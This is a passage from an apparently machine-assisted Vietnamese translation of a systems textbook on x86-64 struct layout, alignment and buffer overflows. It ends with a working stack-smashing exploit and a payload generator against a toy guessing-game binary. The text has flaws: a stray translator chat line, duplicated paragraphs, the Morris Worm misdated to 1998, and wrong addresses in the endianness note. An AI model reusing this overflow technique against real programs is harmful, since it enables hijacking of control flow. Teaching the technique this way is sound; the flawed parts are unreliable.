0x4006c0 &lt;+22&gt;: movss %xmm0,-0x1c(%rbp)      # copy tham số 5 vào %rbp-0x1c (g)
0x4006c5 &lt;+27&gt;: mov   -0x8(%rbp),%rax        # copy s vào %rax
0x4006c9 &lt;+31&gt;: mov   -0x10(%rbp),%rcx       # copy nm vào %rcx
0x4006cd &lt;+35&gt;: mov   $0x40,%edx             # copy 0x40 (64) vào %edx
0x4006d2 &lt;+40&gt;: mov   %rcx,%rsi              # copy nm vào %rsi
0x4006d5 &lt;+43&gt;: mov   %rax,%rdi              # copy s vào %rdi
0x4006d8 &lt;+46&gt;: callq 0x400460 &lt;strncpy@plt&gt; # gọi strncpy(s-&gt;name, nm, 64)
</code></pre>
<ul>
<li>
<p>Đoạn code này chứa một thanh ghi (<code>%xmm0</code>) và lệnh (<code>movss</code>) chưa được đề cập trước đó. <code>%xmm0</code> là ví dụ về thanh ghi dành riêng cho giá trị <strong>floating-point</strong>. Lệnh <code>movss</code> cho biết dữ liệu được di chuyển là kiểu <strong>floating-point đơn chính xác</strong> (single-precision).</p>
</li>
<li>
<p>Phần tiếp theo của code (từ <code>&lt;initStudent+51&gt;</code> đến <code>&lt;initStudent+58&gt;</code>) đặt giá trị của tham số <code>gr</code> tại offset <code>0x44</code> (68) tính từ đầu <code>s</code>.<br />
Xem lại bố cục bộ nhớ trong <strong>Hình 1</strong> cho thấy địa chỉ này tương ứng với <code>s-&gt;grad_yr</code>:</p>
</li>
</ul>
<pre><code>0x4006dd &lt;+51&gt;: mov   -0x8(%rbp),%rax        # copy s vào %rax
0x4006e1 &lt;+55&gt;: mov   -0x18(%rbp),%edx       # copy gr vào %edx
0x4006e4 &lt;+58&gt;: mov   %edx,0x44(%rax)        # copy gr vào %rax+0x44 (s-&gt;grad_yr)
</code></pre>
<ul>
<li>Phần tiếp theo của code (từ <code>&lt;initStudent+61&gt;</code> đến <code>&lt;initStudent+68&gt;</code>) đặt giá trị của tham số <code>ag</code> tại offset <code>0x40</code> (64) tính từ đầu <code>s</code>.<br />
Trong <strong>Hình 1</strong>, địa chỉ này tương ứng với <code>s-&gt;age</code>:</li>
</ul>
<pre><code>0x4006e7 &lt;+61&gt;: mov   -0x8(%rbp),%rax        # copy s vào %rax
0x4006eb &lt;+65&gt;: mov   -0x14(%rbp),%edx       # copy ag vào %edx
0x4006ee &lt;+68&gt;: mov   %edx,0x40(%rax)        # copy ag vào %rax+0x40 (s-&gt;age)
</code></pre>
<ul>
<li>Cuối cùng, các lệnh từ <code>&lt;initStudent+71&gt;</code> đến <code>&lt;initStudent+80&gt;</code> đặt giá trị của tham số <code>g</code> (điểm GPA) vào offset <code>0x48</code> (72) tính từ đầu <code>s</code>.<br />
Offset này khớp với vị trí của field <code>gpa</code> trong <strong>Hình 1</strong>:</li>
</ul>
<pre><code>0x4006f1 &lt;+71&gt;: mov   -0x8(%rbp),%rax        # copy s vào %rax
0x4006f5 &lt;+75&gt;: movss -0x1c(%rbp),%xmm0      # copy g vào %xmm0
0x4006fa &lt;+80&gt;: movss %xmm0,0x48(%rax)       # copy g vào %rax+0x48 (s-&gt;gpa)
</code></pre>
<ul>
<li>Lệnh <code>leaveq</code> tại <code>&lt;initStudent+86&gt;</code> chuẩn bị stack để thoát khỏi hàm, và <code>retq</code> tại <code>&lt;initStudent+87&gt;</code> trả quyền điều khiển về cho hàm gọi. Vì đây là hàm <code>void</code>, giá trị trong <code>%rax</code> sẽ bị bỏ qua.</li>
</ul>
<p>Như vậy, bằng cách quan sát các <strong>byte offset</strong> và cách compiler sử dụng chúng trong các lệnh <code>mov</code>, ta có thể thấy rõ cách các field của struct được truy cập và gán giá trị trong assembly.<br />
Điều này cũng cho thấy lợi ích của việc khai báo các field liên tiếp trong bộ nhớ: compiler chỉ cần cộng thêm offset cố định vào địa chỉ cơ sở của struct để truy cập từng field, giúp việc truy cập dữ liệu nhanh và hiệu quả hơn.</p>
<ul>
<li>Phần tiếp theo của đoạn code (từ <code>&lt;initStudent+61&gt;</code> đến <code>&lt;initStudent+68&gt;</code>) sao chép giá trị tham số <code>ag</code> vào field <code>s→age</code> của <code>struct</code>, field này nằm tại offset <code>0x40</code> (hoặc 64 byte) tính từ địa chỉ của <code>s</code>:</li>
</ul>
<pre><code>0x4006e7 &lt;+61&gt;: mov   -0x8(%rbp),%rax        # copy s vào %rax
0x4006eb &lt;+65&gt;: mov   -0x14(%rbp),%edx       # copy ag vào %edx
0x4006ee &lt;+68&gt;: mov   %edx,0x40(%rax)        # copy ag vào %rax+0x40 (s-&gt;age)
</code></pre>
<ul>
<li>Cuối cùng, giá trị tham số <code>g</code> được sao chép vào field <code>s→gpa</code> (byte offset 72 hoặc <code>0x48</code>) của <code>struct</code>. Lưu ý việc sử dụng thanh ghi <code>%xmm0</code> vì dữ liệu tại vị trí <code>%rbp-0x1c</code> là số thực dấu phẩy động đơn chính xác (single-precision floating point):</li>
</ul>
<pre><code>0x4006f1 &lt;+71&gt;: mov   -0x8(%rbp),%rax        # copy s vào %rax
0x4006f5 &lt;+75&gt;: movss -0x1c(%rbp),%xmm0      # copy g vào %xmm0
0x4006fa &lt;+80&gt;: movss %xmm0,0x48(%rax)       # copy g vào %rax+0x48
</code></pre>
<h3 id="791-data-alignment-và-structs"><a class="header" href="#791-data-alignment-và-structs">7.9.1. Data Alignment và structs</a></h3>
<p>Xét khai báo <code>struct studentT</code> đã được chỉnh sửa như sau:</p>
<pre><code class="language-c">struct studentTM {
    char name[63]; // thay đổi thành 63 thay vì 64
    int  age;
    int  grad_yr;
    float gpa;
};

struct studentTM student2;
</code></pre>
<p>Kích thước của field <code>name</code> được thay đổi thành 63 byte, thay vì 64 byte như ban đầu. Hãy xem điều này ảnh hưởng thế nào đến cách <code>struct</code> được bố trí trong bộ nhớ. Có thể bạn sẽ hình dung nó như trong <a href="C7-x86_64/structs.html#wrongLayout">Hình 2</a>:</p>
<p><img src="C7-x86_64/_images/struct2wrong.png" alt="struct2wrong" /><br />
<strong>Hình 2.</strong> Cách bố trí bộ nhớ <strong>sai</strong> cho struct <code>studentTM</code> đã chỉnh sửa. Lưu ý rằng field <code>name</code> của struct được giảm từ 64 xuống 63 byte.</p>
<p>Trong hình minh họa này, field <code>age</code> xuất hiện ngay ở byte liền kề sau field <code>name</code>. Nhưng đây là <strong>không đúng</strong>. <a href="C7-x86_64/structs.html#correctLayout">Hình 3</a> cho thấy bố trí thực tế trong bộ nhớ:</p>
<p><img src="C7-x86_64/_images/struct2right.png" alt="struct2right" /><br />
<strong>Hình 3.</strong> Cách bố trí bộ nhớ <strong>đúng</strong> cho struct <code>studentTM</code> đã chỉnh sửa. Byte x~63~ được compiler thêm vào để đáp ứng yêu cầu căn chỉnh bộ nhớ (memory alignment), nhưng nó không thuộc về bất kỳ field nào.</p>
<p>Chính sách căn chỉnh (alignment policy) của kiến trúc x64 yêu cầu:</p>
<ul>
<li>Các kiểu dữ liệu 2 byte (ví dụ <code>short</code>) phải nằm ở địa chỉ chia hết cho 2.</li>
<li>Các kiểu dữ liệu 4 byte (ví dụ <code>int</code>, <code>float</code>, <code>unsigned</code>) phải nằm ở địa chỉ chia hết cho 4.</li>
<li>Các kiểu dữ liệu lớn hơn (ví dụ <code>long</code>, <code>double</code>, và con trỏ) phải nằm ở địa chỉ chia hết cho 8.</li>
</ul>
<p>Đối với một <code>struct</code>, compiler sẽ thêm các byte trống (<strong>padding</strong>) giữa các field để đảm bảo mỗi field thỏa coden yêu cầu căn chỉnh của nó.<br />
Ví dụ, trong <code>struct</code> được khai báo ở <strong>Hình 3</strong>, compiler thêm 1 byte padding tại byte x~63~ để đảm bảo field <code>age</code> bắt đầu ở một địa chỉ là bội số của 4.<br />
Các giá trị được căn chỉnh đúng trong bộ nhớ có thể được đọc hoặc ghi chỉ với một thao tác, giúp tăng hiệu suất.</p>
<p>Xét trường hợp khi một <code>struct</code> được định nghĩa như sau:</p>
<pre><code class="language-c">struct studentTM {
    int  age;
    int  grad_yr;
    float gpa;
    char name[63];
};

struct studentTM student3;
</code></pre>
<p>Việc đưa mảng <code>name</code> xuống cuối struct sẽ dời byte padding xuống cuối struct, đảm bảo rằng <code>age</code>, <code>grad_yr</code> và <code>gpa</code> đều được căn chỉnh theo 4 byte.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="710-thực-tế-buffer-overflow"><a class="header" href="#710-thực-tế-buffer-overflow">7.10. Thực tế: Buffer Overflow</a></h2>
<p>Ngôn ngữ C không thực hiện việc kiểm tra giới hạn mảng (array bounds checking) một cách tự động. Việc truy cập bộ nhớ nằm ngoài phạm vi của một mảng là vấn đề nghiêm trọng và thường dẫn đến các lỗi như <strong>segmentation fault</strong>. Tuy nhiên, một kẻ tấn công tinh vi có thể chèn code độc nhằm cố ý vượt quá giới hạn của mảng (còn gọi là <strong>buffer</strong>) để buộc chương trình thực thi theo cách không mong muốn. Trong trường hợp tồi tệ nhất, kẻ tấn công có thể chạy code cho phép chúng giành được <strong>root privilege</strong> (đặc quyền root), tức quyền truy cập cấp hệ điều hành vào hệ thống máy tính. Một phần mềm lợi dụng sự tồn tại của một lỗi <strong>buffer overrun</strong> đã biết trong chương trình được gọi là <strong>buffer overflow exploit</strong>.</p>
<p>Trong phần này, chúng ta sẽ sử dụng <strong>GDB</strong> và ngôn ngữ assembly để phân tích đầy đủ cơ chế của một buffer overflow exploit. Trước khi đọc chương này, chúng tôi khuyến khích bạn xem chương nói về <a href="C7-x86_64/../C3-C_debug/gdb_assembly.html#_debugging_assembly_code">GDB để kiểm tra code assembly</a>.</p>
<h3 id="7101-các-ví-dụ-nổi-tiếng-về-buffer-overflow"><a class="header" href="#7101-các-ví-dụ-nổi-tiếng-về-buffer-overflow">7.10.1. Các ví dụ nổi tiếng về Buffer Overflow</a></h3>
<p>Các buffer overflow exploit xuất hiện từ những năm 1980 và vẫn là một mối đe dọa lớn đối với ngành công nghiệp máy tính cho đến đầu những năm 2000. Mặc dù nhiều hệ điều hành hiện đại đã có các cơ chế bảo vệ chống lại những kiểu tấn công buffer overflow đơn giản nhất, nhưng các lỗi lập trình bất cẩn vẫn có thể khiến các chương trình hiện đại dễ dàng bị tấn công. Gần đây, các buffer overflow exploit đã được phát hiện trong Skype¹, Android², Google Chrome³ và nhiều phần mềm khác.</p>
<p>Dưới đây là một số ví dụ lịch sử đáng chú ý về buffer overflow exploit:</p>
<p><strong>The Morris Worm</strong><br />
Morris Worm⁴ được phát tán vào năm 1998 trên ARPANet từ MIT (nhằm che giấu việc nó được viết bởi một sinh viên Đại học Cornell) và đã khai thác một lỗ hổng buffer overrun tồn tại trong <strong>UNIX finger daemon</strong> (<code>fingerd</code>). Trong Linux và các hệ thống tương tự UNIX khác, <strong>daemon</strong> là một loại tiến trình chạy liên tục ở chế độ nền, thường thực hiện các tác vụ dọn dẹp và giám sát. Daemon <code>fingerd</code> trả về báo cáo thân thiện về một máy tính hoặc một người dùng. Điều quan trọng nhất là con sâu này có cơ chế tự nhân bản, khiến nó được gửi nhiều lần đến cùng một máy tính, làm hệ thống chậm đến mức không thể sử dụng được. Mặc dù tác giả tuyên bố rằng con sâu này chỉ là một bài tập trí tuệ vô hại, nhưng cơ chế nhân bản đã giúp nó lây lan dễ dàng và khó bị loại bỏ. Trong những năm sau đó, các loại sâu khác cũng sử dụng buffer overflow exploit để giành quyền truy cập trái phép vào hệ thống. Các ví dụ nổi bật gồm Code Red (2001), MS-SQLSlammer (2003) và W32/Blaster (2003).</p>
<p><strong>AOL Chat Wars</strong><br />
David Auerbach⁵, một cựu kỹ sư của Microsoft, đã kể lại trải nghiệm của mình với một buffer overflow trong quá trình tích hợp <strong>Microsoft Messenger Service</strong> (MMS) với <strong>AOL Instant Messenger</strong> vào cuối những năm 1990. Khi đó, AOL Instant Messenger (AIM) là dịch vụ nhắn tin nhanh phổ biến nhất. Microsoft tìm cách tham gia thị trường này bằng cách thiết kế một tính năng trong MMS cho phép người dùng MMS trò chuyện với các “buddies” trên AIM. Không hài lòng, AOL đã vá máy chủ của họ để MMS không thể kết nối nữa. Các kỹ sư Microsoft tìm ra cách để các client MMS bắt chước thông điệp mà client AIM gửi tới máy chủ AOL, khiến AOL khó phân biệt giữa tin nhắn từ MMS và AIM. AOL đáp trả bằng cách thay đổi cách AIM gửi tin nhắn, và các kỹ sư MMS lại điều chỉnh để phù hợp. “Cuộc chiến chat” này tiếp diễn cho đến khi AOL bắt đầu sử dụng một lỗi buffer overflow <em>ngay trong client của họ</em> để xác minh rằng tin nhắn được gửi từ client AIM. Vì client MMS không có cùng lỗ hổng này, cuộc chiến chat kết thúc với phần thắng thuộc về AOL.</p>
<h3 id="7102-cái-nhìn-đầu-tiên-trò-chơi-đoán-số"><a class="header" href="#7102-cái-nhìn-đầu-tiên-trò-chơi-đoán-số">7.10.2. Cái nhìn đầu tiên: Trò chơi đoán số</a></h3>
<p>Để giúp bạn hiểu cơ chế của một cuộc tấn công buffer overflow, chúng tôi cung cấp một chương trình thực thi đơn giản cho phép người dùng chơi trò chơi đoán số với chương trình. Tải tệp thực thi <code>secret</code> tại <a href="C7-x86_64/_attachments/secretx86-64.tar.gz">liên kết này</a> và giải nén bằng lệnh <code>tar</code>:</p>
<pre><code>$ tar -xzvf secretx86-64.tar.gz
</code></pre>
<p>Dưới đây là bản sao của <code>main.c</code> (<a href="C7-x86_64/_attachments/main.c">main.c</a>), tệp chính liên quan đến tệp thực thi:</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &quot;other.h&quot; //contains secret function definitions

/*prints out the You Win! message*/
void endGame(void) {
    printf(&quot;You win!\n&quot;);
    exit(0);
}

/*main function of the game*/
int main(void) {
    int guess, secret, len, x=3;
    char buf[12]; //buffer (12 bytes long)

    printf(&quot;Enter secret number:\n&quot;);
    scanf(&quot;%s&quot;, buf); //read guess from user input
    guess = atoi(buf); //convert to an integer

    secret = getSecretCode(); //call the getSecretCode function

    //check to see if guess is correct
    if (guess == secret) {
        printf(&quot;You got it right!\n&quot;);
    }
    else {
        printf(&quot;You are so wrong!\n&quot;);
        return 1; //if incorrect, exit
    }

    printf(&quot;Enter the secret string to win:\n&quot;);
    scanf(&quot;%s&quot;, buf); //get secret string from user input

    guess = calculateValue(buf, strlen(buf)); //call calculateValue function

    //check to see if guess is correct
    if (guess != secret) {
        printf(&quot;You lose!\n&quot;);
        return 2; //if guess is wrong, exit
    }

    /*if both the secret string and number are correct
    call endGame()*/
    endGame();

    return 0;
}
</code></pre>
<p>Trò chơi này yêu cầu người dùng nhập trước một số bí mật, sau đó là một chuỗi bí mật để thắng trò chơi. Tệp header <code>other.h</code> chứa định nghĩa của các hàm <code>getSecretCode</code> và <code>calculateValue</code>, nhưng chúng ta không có tệp này. Vậy làm thế nào để người dùng thắng trò chơi? Thử brute force sẽ mất quá nhiều thời gian. Một chiến lược là phân tích tệp thực thi <code>secret</code> trong GDB và từng bước theo dõi code assembly để tìm ra số và chuỗi bí mật. Quá trình phân tích code assembly để tìm hiểu cách nó hoạt động thường được gọi là <strong>reverse engineering</strong> assembly. Những người đã quen với GDB và đọc assembly có thể tìm ra số và chuỗi bí mật bằng cách reverse engineer chúng trong GDB.</p>
<p>Tuy nhiên, vẫn còn một cách khác, tinh vi hơn để chiến thắng.</p>
<h3 id="7103-xem-xét-kỹ-hơn-under-the-c"><a class="header" href="#7103-xem-xét-kỹ-hơn-under-the-c">7.10.3. Xem xét kỹ hơn (Under the C)</a></h3>
<p>Chương trình chứa một lỗ hổng buffer overrun tiềm ẩn tại lần gọi <code>scanf</code> đầu tiên. Để hiểu chuyện gì đang xảy ra, hãy kiểm tra code assembly của hàm <code>main</code> bằng GDB. Chúng ta cũng sẽ đặt một <strong>breakpoint</strong> tại địa chỉ <code>0x0000000000400717</code>, đây là địa chỉ của lệnh ngay trước khi gọi <code>scanf</code> (lưu ý rằng nếu đặt breakpoint tại địa chỉ của <code>scanf</code> thì chương trình sẽ dừng <em>bên trong</em> lệnh gọi <code>scanf</code>, chứ không phải trong <code>main</code>).</p>
<pre><code>    0x00000000004006f2 &lt;+0&gt;:   push   %rbp
    0x00000000004006f3 &lt;+1&gt;:   mov    %rsp,%rbp
    0x00000000004006f6 &lt;+4&gt;:   sub    $0x20,%rsp
    0x00000000004006fa &lt;+8&gt;:   movl   $0x3,-0x4(%rbp)
    0x0000000000400701 &lt;+15&gt;:  mov    $0x400873,%edi
    0x0000000000400706 &lt;+20&gt;:  callq  0x400500 &lt;printf@plt&gt;
    0x000000000040070b &lt;+25&gt;:  lea    -0x20(%rbp),%rax
    0x000000000040070f &lt;+29&gt;:  mov    %rax,%rsi
    0x0000000000400712 &lt;+32&gt;:  mov    $0x400888,%edi
=&gt;  0x0000000000400717 &lt;+37&gt;:  mov    $0x0,%eax
    0x000000000040071c &lt;+42&gt;:  callq  0x400540 &lt;scanf@plt&gt;
</code></pre>
<p>Hình 1 mô tả stack ngay trước khi gọi <code>scanf</code>.</p>
<p><img src="C7-x86_64/_images/beforeScanf.png" alt="before" /></p>
<p><strong>Hình 1.</strong> Call stack ngay trước khi gọi <code>scanf</code></p>
<p>Trước khi gọi <code>scanf</code>, hai đối số đầu tiên của <code>scanf</code> lần lượt được nạp sẵn vào các thanh ghi <code>%edi</code> và <code>%rsi</code>. Lệnh <code>lea</code> tại vị trí <code>&lt;main+25&gt;</code> tạo tham chiếu cho mảng <code>buf</code>.</p>
<p>Bây giờ, giả sử người dùng nhập <code>1234567890</code> tại dấu nhắc. <a href="C7-x86_64/buffer_overflow.html#afterScanf">Hình 2</a> minh họa stack trông như thế nào ngay sau khi lệnh <code>scanf</code> hoàn tất.</p>
<p><img src="C7-x86_64/_images/afterScanf.png" alt="after" /></p>
<p><strong>Hình 2.</strong> Call stack ngay sau khi gọi <code>scanf</code> với đầu vào <code>1234567890</code></p>
<p>Hãy nhớ rằng giá trị hex của code ASCII cho các chữ số từ 0 đến 9 là từ 0x30 đến 0x39, và mỗi ô nhớ trên stack có kích thước 8 byte. <strong>Frame pointer</strong> cách <strong>stack pointer</strong> 32 byte. Người đọc có thể xác nhận giá trị của <code>%rbp</code> bằng cách dùng GDB để in ra (<code>p $rbp</code>). Trong ví dụ này, <code>%rbp</code> có giá trị <code>0x7fffffffdd10</code>. Lệnh sau cho phép kiểm tra 48 byte (dưới dạng hex) bên dưới thanh ghi <code>%rsp</code>:</p>
<pre><code>(gdb) x /48bx $rsp
</code></pre>
<p>Lệnh GDB này cho ra kết quả tương tự như sau:</p>
<pre><code>(gdb) x /48bx $rsp
0x7fffffffdcf0: 0x31  0x32  0x33  0x34  0x35  0x36  0x37  0x38
0x7fffffffdcf8: 0x39  0x30  0x00  0x00  0x00  0x00  0x00  0x00
0x7fffffffdd00: 0xf0  0xdd  0xff  0xff  0xff  0x7f  0x00  0x00
0x7fffffffdd08: 0x00  0x00  0x00  0x00  0x03  0x00  0x00  0x00
0x7fffffffdd10: 0xd0  0x07  0x40  0x00  0x00  0x00  0x00  0x00
0x7fffffffdd18: 0x30  0xd8  0xa2  0xf7  0xff  0x7f  0x00  0x00
</code></pre>
<p>Mỗi dòng biểu diễn một địa chỉ 64-bit, hoặc hai địa chỉ 32-bit. Vì vậy, giá trị gắn với địa chỉ 32-bit <code>0x7fffffffdd0c</code> nằm ở 4 byte ngoài cùng bên phải của dòng hiển thị <code>0x7fffffffdd08</code>.</p>
<blockquote>
<p><strong>Giá trị nhiều byte được lưu theo thứ tự little-endian</strong><br />
Trong đoạn assembly ở trên, byte tại địa chỉ <code>0xf7ffffffdd00</code> là <code>0xf0</code>, byte tại <code>0xf7ffffffdd01</code> là <code>0xdd</code>, byte tại <code>0xf7ffffffdd02</code> là <code>0xff</code>, byte tại <code>0xf7ffffffdd03</code> là <code>0xff</code>, byte tại <code>0xf7ffffffdd04</code> là <code>0xff</code>, và byte tại <code>0xf7ffffffdd05</code> là <code>0x7f</code>. Tuy nhiên, <em>giá trị</em> 64-bit tại địa chỉ <code>0x7fffffffdd00</code> thực tế là <code>0x7fffffffddf0</code>. Hãy nhớ rằng vì x86-64 là một hệ thống <a href="C7-x86_64/../C4-Binary/byte_order.html#_integer_byte_order">little-endian</a>, các byte của giá trị nhiều byte (như địa chỉ) được lưu theo thứ tự đảo ngược.</p>
</blockquote>
<p>Trong ví dụ này, địa chỉ của <code>buf</code> nằm ở đỉnh stack. Do đó, hai địa chỉ đầu tiên chứa các byte đầu vào tương ứng với chuỗi <code>1234567890</code>:</p>
<pre><code>0x7fffffffdcf0: 0x31  0x32  0x33  0x34  0x35  0x36  0x37  0x38
0x7fffffffdcf8: 0x39  0x30  0x00  0x00  0x00  0x00  0x00  0x00
</code></pre>
<p>Byte kết thúc null <code>\0</code> xuất hiện ở byte có trọng số thứ ba tại địa chỉ <code>0x7fffffffdcf8</code> (tức tại <code>0x7fffffffdcfa</code>). Hãy nhớ rằng <code>scanf</code> luôn kết thúc chuỗi bằng một byte null.</p>
<p>Tất nhiên, <code>1234567890</code> không phải là số bí mật. Đây là kết quả khi chạy <code>secret</code> với chuỗi đầu vào <code>1234567890</code>:</p>
<pre><code>$ ./secret
Enter secret number:
1234567890
You are so wrong!
$ echo $?
1
</code></pre>
<p>Lệnh <code>echo $?</code> in ra giá trị trả về của lệnh cuối cùng được thực thi trong shell. Trong trường hợp này, chương trình trả về <code>1</code> vì số bí mật nhập vào sai. Theo quy ước, chương trình trả về <code>0</code> khi không có lỗi. Mục tiêu của chúng ta là tìm cách khiến chương trình thoát với giá trị trả về <code>0</code>, nghĩa là chúng ta thắng trò chơi.</p>
<h3 id="7104-buffer-overflow-lần-thử-đầu-tiên"><a class="header" href="#7104-buffer-overflow-lần-thử-đầu-tiên">7.10.4. Buffer Overflow: Lần thử đầu tiên</a></h3>
<p>Tiếp theo, hãy thử nhập chuỗi<br />
<code>1234567890123456789012345678901234567890123</code>:</p>
<pre><code>$ ./secret
Enter secret number:
1234567890123456789012345678901234567890123
You are so wrong!
Segmentation fault (core dumped)
$ echo $?
139
</code></pre>
<p>Thú vị đấy! Lần này chương trình bị crash với lỗi segmentation fault, code trả về 139. <strong>Hình 3</strong> cho thấy call stack của <code>main</code> ngay sau khi gọi <code>scanf</code> với chuỗi đầu vào mới này.</p>
<p><img src="C7-x86_64/_images/afterScanf2.png" alt="after2" /></p>
<p><strong>Hình 3.</strong> Call stack ngay sau khi gọi <code>scanf</code> với đầu vào <code>1234567890123456789012345678901234567890123</code></p>
<p>Chuỗi nhập vào dài đến mức không chỉ ghi đè các giá trị tại <code>0xd08</code> và <code>0xd10</code>, mà còn tràn xuống ghi đè cả <strong>return address</strong> bên dưới stack frame của <code>main</code>. Hãy nhớ rằng khi một hàm trả về, chương trình sẽ cố gắng tiếp tục thực thi tại địa chỉ được lưu trong return address. Trong ví dụ này, chương trình cố gắng tiếp tục tại địa chỉ <code>0xf7ff00333231</code> sau khi thoát <code>main</code>, nhưng địa chỉ này không tồn tại. Vì vậy, chương trình bị crash với segmentation fault.</p>
<p>Chạy lại chương trình trong GDB (<code>input.txt</code> chứa chuỗi đầu vào ở trên) cho thấy rõ điều này:</p>
<pre><code>$ gdb secret
(gdb) break *0x0000000000400717
(gdb) run &lt; input.txt
(gdb) ni
(gdb) x /48bx $rsp
0x7fffffffdcf0: 0x31  0x32  0x33  0x34  0x35  0x36  0x37  0x38
0x7fffffffdcf8: 0x39  0x30  0x31  0x32  0x33  0x34  0x35  0x36
0x7fffffffdd00: 0x37  0x38  0x39  0x30  0x31  0x32  0x33  0x34
0x7fffffffdd08: 0x35  0x36  0x37  0x38  0x39  0x30  0x31  0x32
0x7fffffffdd10: 0x33  0x34  0x35  0x36  0x37  0x38  0x39  0x30
0x7fffffffdd18: 0x31  0x32  0x33  0x00  0xff  0x7f  0x00  0x00
(gdb) n
Single stepping until exit from function main,
which has no line number information.
You are so wrong!
0x00007fff00333231 in ?? ()
</code></pre>
<p>Tất nhiên rồi, mình sẽ tiếp tục phần dịch còn lại ngay đây nhé — nối tiếp từ chỗ chúng ta đang nói về chuỗi nhập đã vượt quá giới hạn mảng <code>buf</code> và gây ra lỗi <strong>smashing the stack</strong>.</p>
<p>…Hãy chú ý rằng chuỗi nhập vào đã vượt quá giới hạn khai báo của mảng <code>buf</code>, ghi đè toàn bộ các giá trị khác được lưu trên stack. Nói cách khác, chuỗi này đã tạo ra một <strong>buffer overrun</strong> và làm hỏng <strong>call stack</strong>, khiến chương trình bị crash. Quá trình này còn được gọi là <strong>smashing the stack</strong>.</p>
<p>Khi điều này xảy ra, không chỉ dữ liệu cục bộ bị ghi đè, mà cả <strong>return address</strong> (địa chỉ trả về) của hàm <code>main</code> cũng bị thay đổi. Vì CPU sẽ cố gắng tiếp tục thực thi tại địa chỉ được lưu trong return address khi hàm kết thúc, nên nếu địa chỉ này bị thay đổi thành một giá trị không hợp lệ (hoặc trỏ đến vùng bộ nhớ không được phép truy cập), chương trình sẽ gặp lỗi <strong>segmentation fault</strong> ngay lập tức.</p>
<p>Đây chính là nguyên lý cơ bản mà các cuộc tấn công <strong>buffer overflow exploit</strong> khai thác:</p>
<ul>
<li>Nếu kẻ tấn công có thể kiểm soát dữ liệu ghi đè lên return address,</li>
<li>Họ có thể khiến chương trình nhảy tới và thực thi code tùy ý do họ chèn vào bộ nhớ.</li>
</ul>
<p>Trong ví dụ này, chúng ta mới chỉ vô tình (hoặc cố ý) làm hỏng return address bằng một chuỗi ký tự dài, dẫn đến crash. Nhưng với kỹ thuật tinh vi hơn, kẻ tấn công có thể thay thế return address bằng địa chỉ của một đoạn code độc đã được chuẩn bị sẵn trong bộ nhớ, từ đó chiếm quyền điều khiển chương trình.</p>
<h3 id="7105-buffer-overflow-thông-minh-hơn-lần-thử-thứ-hai"><a class="header" href="#7105-buffer-overflow-thông-minh-hơn-lần-thử-thứ-hai">7.10.5. Buffer Overflow thông minh hơn: Lần thử thứ hai</a></h3>
<p>Ví dụ đầu tiên của chúng ta đã <strong>smash the stack</strong> (đập vỡ stack) bằng cách ghi đè thanh ghi <code>%rbp</code> và <strong>return address</strong> (địa chỉ trả về) bằng dữ liệu rác, khiến chương trình bị crash. Một kẻ tấn công chỉ muốn làm chương trình sập thì đến đây đã hài lòng. Tuy nhiên, mục tiêu của chúng ta là <strong>đánh lừa</strong> trò chơi đoán số để nó trả về giá trị 0, cho thấy rằng chúng ta đã thắng. Chúng ta sẽ làm điều này bằng cách lấp đầy <strong>call stack</strong> bằng dữ liệu có ý nghĩa hơn là giá trị rác. Ví dụ, ta có thể ghi đè stack sao cho return address được thay thế bằng địa chỉ của hàm <code>endGame</code>. Khi đó, khi chương trình cố gắng trả về từ <code>main</code>, nó sẽ thực thi <code>endGame</code> thay vì crash với segmentation fault.</p>
<p>Để tìm địa chỉ của <code>endGame</code>, hãy kiểm tra lại <code>secret</code> trong GDB:</p>
<pre><code>$ gdb secret
(gdb) disas endGame
Dump of assembler code for function endGame:
    0x00000000004006da &lt;+0&gt;:   push   %rbp
    0x00000000004006db &lt;+1&gt;:   mov    %rsp,%rbp
    0x00000000004006de &lt;+4&gt;:   mov    $0x40086a,%edi
    0x00000000004006e3 &lt;+9&gt;:   callq  0x400500 &lt;puts@plt&gt;
    0x00000000004006e8 &lt;+14&gt;:  mov    $0x0,%edi
    0x00000000004006ed &lt;+19&gt;:  callq  0x400550 &lt;exit@plt&gt;
End of assembler dump.
</code></pre>
<p>Quan sát thấy <code>endGame</code> bắt đầu tại địa chỉ <code>0x00000000004006da</code>. <a href="C7-x86_64/buffer_overflow.html#finalExploit">Hình 4</a> minh họa một ví dụ exploit buộc <code>secret</code> chạy hàm <code>endGame</code>.</p>
<p><img src="C7-x86_64/_images/finalExploit.png" alt="exploit" /></p>
<p><strong>Hình 4.</strong> Một chuỗi mẫu có thể buộc <code>secret</code> thực thi hàm <code>endGame</code></p>
<p>Về cơ bản, có 40 byte dữ liệu rác theo sau là return address. Một lần nữa, vì x86-64 là hệ thống <a href="C7-x86_64/../C4-Binary/byte_order.html#_integer_byte_order">little-endian</a>, các byte trong return address sẽ xuất hiện theo thứ tự đảo ngược.</p>
<p>Chương trình sau minh họa cách một kẻ tấn công có thể tạo ra exploit ở trên:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

char ebuff[]=
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30&quot; /*first 10 bytes of junk*/
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30&quot; /*next 10 bytes of junk*/
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30&quot; /*following 10 bytes of junk*/
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30&quot; /*last 10 bytes of junk*/
&quot;\xda\x06\x40\x00\x00\x00\x00\x00&quot; /*address of endGame (little endian)*/
;

int main(void) {
    int i;
    for (i = 0; i &lt; sizeof(ebuff); i++) { /*print each character*/
        printf(&quot;%c&quot;, ebuff[i]);
    }
    return 0;
}
</code></pre>
<p>Ký hiệu <code>\x</code> trước mỗi số cho biết số đó được định dạng dưới dạng giá trị hex của một ký tự. Sau khi định nghĩa <code>ebuff[]</code>, hàm <code>main</code> chỉ đơn giản in ra từng ký tự một. Để tạo chuỗi byte tương ứng, biên dịch và chạy chương trình như sau:</p>
<pre><code>$ gcc -o genEx genEx.c
$ ./genEx &gt; exploit
</code></pre>
<p>Để dùng tệp <code>exploit</code> làm đầu vào cho <code>scanf</code>, chỉ cần chạy <code>secret</code> với <code>exploit</code> như sau:</p>
<pre><code>$ ./secret &lt; exploit
Enter secret number:
You are so wrong!
You win!
</code></pre>
